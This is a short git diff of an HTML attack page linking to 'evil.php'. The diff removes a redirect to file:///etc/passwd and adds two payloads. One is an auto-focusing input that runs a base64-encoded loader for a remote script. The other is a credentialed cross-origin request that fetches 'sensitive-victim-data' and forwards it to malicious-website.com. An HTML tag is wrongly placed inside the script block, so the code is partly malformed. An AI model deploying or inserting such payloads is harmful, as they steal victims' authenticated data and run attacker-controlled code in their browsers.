@@ -8,12 +8,16 @@
 <body>
     <a href="evil.php">Download</a>
     <script>
-       
-        function redirectToLocation() {
-          window.location.href = 'file:///etc/passwd';
-          
-        }
-        window.onload = redirectToLocation
+        <input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzZ4eXYwNjN6azgiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus>
+        var req = new XMLHttpRequest();
+        req.onload = reqListener;
+        req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
+        req.withCredentials = true;
+        req.send();
+        
+        function reqListener() {
+        	location='//malicious-website.com/log?key='+this.responseText;
+        };
     </script>
 </body>
 </html>
